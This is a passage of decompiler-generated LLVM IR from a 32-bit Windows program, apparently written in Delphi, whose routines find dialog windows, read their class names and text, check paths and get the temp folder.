  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1639
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1639
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1639
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1640
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1641
  %3 = add i32 %2, -1, !insn.addr !1641
  %4 = icmp eq i32 %2, 0, !insn.addr !1641
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1641
  %5 = icmp eq i1 %4, false, !insn.addr !1642
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1642

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1643
  br label %dec_label_pc_406de8, !insn.addr !1644

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1645
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1646
  ret i32 0, !insn.addr !1647
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1648
  ret i32 %0, !insn.addr !1648
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1649
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1650
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1651
  ret i1 %0, !insn.addr !1651
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1652
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1653
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1654
  %2 = icmp eq i32 %1, 0, !insn.addr !1655
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1656
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1656

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1653
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1657
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1657
  %7 = load i8, i8* %6, align 1, !insn.addr !1657
  %8 = icmp eq i8 %7, 92, !insn.addr !1657
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1658

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1659
  store i8 92, i8* %9, align 1, !insn.addr !1659
  %10 = or i32 %3, 1, !insn.addr !1660
  %11 = add i32 %1, %10, !insn.addr !1660
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1660
  store i8 0, i8* %12, align 1, !insn.addr !1660
  br label %dec_label_pc_406e30, !insn.addr !1660

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1661
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1661
  br label %dec_label_pc_406e3e, !insn.addr !1661

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1662
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1663
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1664
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1665
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1665
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1665
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1666
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1667
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1667
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1668
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1668
  %5 = icmp eq i1 %4, false, !insn.addr !1669
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1670
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1670

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1671
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1671
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1672
  %8 = icmp eq i32 %7, 32770, !insn.addr !1673
  %9 = icmp eq i1 %8, false, !insn.addr !1674
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1674
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1674

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1675
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1675
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1676
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1676
  %13 = add i32 %arg1, 4, !insn.addr !1677
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1677
  %15 = load i32, i32* %14, align 4, !insn.addr !1677
  %16 = icmp eq i32 %15, %12, !insn.addr !1677
  %17 = icmp eq i1 %16, false, !insn.addr !1678
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1678
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1678

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1679
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1679
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1680
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1681
  %21 = load i32, i32* %20, align 4, !insn.addr !1681
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1682
  %23 = icmp eq i32 %21, %22, !insn.addr !1682
  %24 = icmp eq i1 %23, false, !insn.addr !1683
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1683
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1683

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1684
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1684
  %27 = load i32, i32* %26, align 4, !insn.addr !1684
  %28 = icmp eq i32 %27, 0, !insn.addr !1684
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1685

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1686
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1687
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1688
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1689
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1689
  %34 = load i32, i32* %33, align 4, !insn.addr !1689
  %35 = add i32 %arg1, 16, !insn.addr !1690
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1690
  %37 = load i32, i32* %36, align 4, !insn.addr !1690
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1691
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1691
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1691
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1691
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1691
  %43 = add i32 %arg1, 24, !insn.addr !1692
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1692
  store i32 %42, i32* %44, align 4, !insn.addr !1692
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1693
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1693
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1694
  %47 = icmp eq i1 %46, false, !insn.addr !1695
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1696
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1696

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1697
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1697
  store i32 %arg2, i32* %49, align 4, !insn.addr !1697
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1698
  br label %dec_label_pc_406eff, !insn.addr !1698

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1699
  %51 = load i32, i32* %50, align 4, !insn.addr !1699
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1700
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1701
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1701
  store i32 4222753, i32* %53, align 4, !insn.addr !1701
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1702
  ret i32 %54, !insn.addr !1703
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1704
  ret i32 %0, !insn.addr !1704
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1705
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1706
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1707
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1708
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1709
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1709
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1709
  %6 = call i32 @function_40441c(), !insn.addr !1710
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1711
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1712
  br label %dec_label_pc_406f70, !insn.addr !1712

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1711
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1711
  store i32 %7, i32* %9, align 4, !insn.addr !1711
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1713
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1713
  store i32 4222536, i32* %11, align 4, !insn.addr !1713
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1714
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1715
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1715
  store i32 1, i32* %14, align 4, !insn.addr !1715
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1716
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1717
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1717
  store i32 0, i32* %16, align 4, !insn.addr !1717
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1718
  %18 = icmp eq i1 %17, false, !insn.addr !1719
  %19 = icmp eq i1 %18, false, !insn.addr !1720
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1720

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1721
  %21 = sub i32 %20, %6, !insn.addr !1722
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1723
  %23 = icmp eq i1 %22, false, !insn.addr !1724
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1724
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1724

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1725
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1726
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1727
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1728
  %edi.0.reg2mem = alloca i32, !insn.addr !1728
  %ecx.0.reg2mem = alloca i32, !insn.addr !1728
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1729
  br label %2, !insn.addr !1729

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1729
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1729
  br i1 %3, label %10, label %4, !insn.addr !1729

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1729
  %6 = load i8, i8* %5, align 1, !insn.addr !1729
  %7 = icmp eq i8 %6, 0, !insn.addr !1729
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1729
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1729
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1729
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1729
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1729
  br i1 %7, label %10, label %2, !insn.addr !1729

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1730
  ret i32 %11, !insn.addr !1731
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1732
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1733
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1733
  %4 = add i32 %3, %1, !insn.addr !1734
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1734
  store i8 0, i8* %5, align 1, !insn.addr !1734
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1735
  ret i32 %6, !insn.addr !1736
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1737
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1738
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1739
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1739
  %6 = add i32 %5, %3, !insn.addr !1740
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1740
  store i8 0, i8* %7, align 1, !insn.addr !1740
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1741
  ret i32 %8, !insn.addr !1742
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1743
  %1 = call i32 @function_4034c8(), !insn.addr !1744
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1745
  ret i32 %2, !insn.addr !1746
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1747
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1748
  ret i32 %1, !insn.addr !1749
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1750
  %1 = call i32 @function_4036c8(), !insn.addr !1751
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1752
  %3 = icmp eq i32 %2, 2, !insn.addr !1753
  %4 = zext i1 %3 to i32, !insn.addr !1754
  %5 = and i32 %2, -256, !insn.addr !1754
  %6 = or i32 %5, %4, !insn.addr !1754
  ret i32 %6, !insn.addr !1755
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1756
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1756
  %esp.02.reg2mem = alloca i32, !insn.addr !1756
  %storemerge3.reg2mem = alloca i32, !insn.addr !1756
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1757
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1757
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1757
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1758
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1759
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1760
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1760
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1761
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1761
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1761
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1762
  %9 = icmp eq i1 %8, false, !insn.addr !1763
  %10 = icmp eq i1 %9, false, !insn.addr !1764
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1764
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1764
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1764
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1764
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1764

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1765
  %12 = call i32 @function_407134(), !insn.addr !1766
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1767
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1767
  store i32 2, i32* %14, align 4, !insn.addr !1767
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1768
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1768
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1768
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1769
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1761
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1761
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1762
  %21 = icmp eq i1 %20, false, !insn.addr !1763
  %22 = icmp eq i1 %21, false, !insn.addr !1764
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1764
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1764
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1764
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1764
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1764

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1770
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1771
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1772
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1772
  store i32 4223413, i32* %25, align 4, !insn.addr !1772
  %26 = call i32 @"@LStrClr"(), !insn.addr !1773
  ret i32 %26, !insn.addr !1774
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1775
  ret i32 %0, !insn.addr !1775
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1776
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1777
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1778
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1778
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1778
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1779
  %2 = call i32 @function_407054(), !insn.addr !1780
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1781
  %4 = call i32 @function_407134(), !insn.addr !1782
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1783
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1784
  %6 = call i32 @"@LStrClr"(), !insn.addr !1785
  ret i32 %6, !insn.addr !1786
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1787
  ret i32 %0, !insn.addr !1787
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1788
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1789
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1790
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1790
  store i32 %3, i32* %4, align 4, !insn.addr !1790
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1791
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1791
  %9 = add i8 %6, %8, !insn.addr !1791
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1791
  store i8 %9, i8* %10, align 1, !insn.addr !1791
  %11 = add i32 %2, 81, !insn.addr !1792
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1792
  %13 = load i8, i8* %12, align 1, !insn.addr !1792
  %14 = trunc i32 %1 to i8, !insn.addr !1792
  %15 = add i8 %13, %14, !insn.addr !1792
  store i8 %15, i8* %12, align 1, !insn.addr !1792
  %16 = load i32, i32* %eax, align 4, !insn.addr !1793
  ret i32 %16, !insn.addr !1793
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1794
  ret x86_fp80 %1, !insn.addr !1795
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1796
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1797
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1797
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1797
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1798
  %3 = call i32 @function_407054(), !insn.addr !1799
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1800
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1801
  %6 = icmp eq i32 %5, 180, !insn.addr !1802
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1803
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1803

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1804
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1805
  %10 = icmp eq i1 %9, false, !insn.addr !1806
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1806
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1806

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1807
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1808
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1809
  %13 = add i32 %esp.1, 8, !insn.addr !1810
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1810
  store i32 4223702, i32* %14, align 4, !insn.addr !1810
  %15 = call i32 @"@LStrClr"(), !insn.addr !1811
  ret i32 %15, !insn.addr !1812
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1813
  ret i32 %0, !insn.addr !1813
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1814
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1815
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1816
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1816
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1816
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1817
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1818
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1818
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1819
